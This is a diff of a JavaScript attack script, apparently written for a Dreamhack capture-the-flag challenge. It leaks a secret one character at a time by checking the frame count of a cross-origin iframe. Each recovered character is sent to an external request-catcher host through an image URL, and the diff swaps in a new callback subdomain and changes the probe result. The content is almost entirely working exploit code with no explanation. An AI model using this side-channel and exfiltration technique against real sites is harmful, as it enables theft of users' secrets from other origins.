@@ -12,6 +12,7 @@
             function removeIframe() {
                 if (!removed) {
                     removed = true;
+                    iframe.onload = null;
                     document.body.removeChild(iframe);
                 }
             }
@@ -20,7 +21,7 @@
                 try {
                     let result = iframe.contentWindow.frames.length;
                     removeIframe();
-                    resolve(result > 0);
+                    resolve(true);
                 } catch (e) {
                     removeIframe();
                     resolve(false);
@@ -48,13 +49,13 @@
                 if (rslt.success) {
                     secret += rslt.char;
                     found = true;
-                    img.src = `https://yrvycnj.request.dreamhack.games/${secret}`;
+                    img.src = `https://ylpjamb.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
 
             if (!found) {
-                img.src = `https://yrvycnj.request.dreamhack.games/failed`;
+                img.src = `https://ylpjamb.request.dreamhack.games/failed`;
                 return;
             }
         }
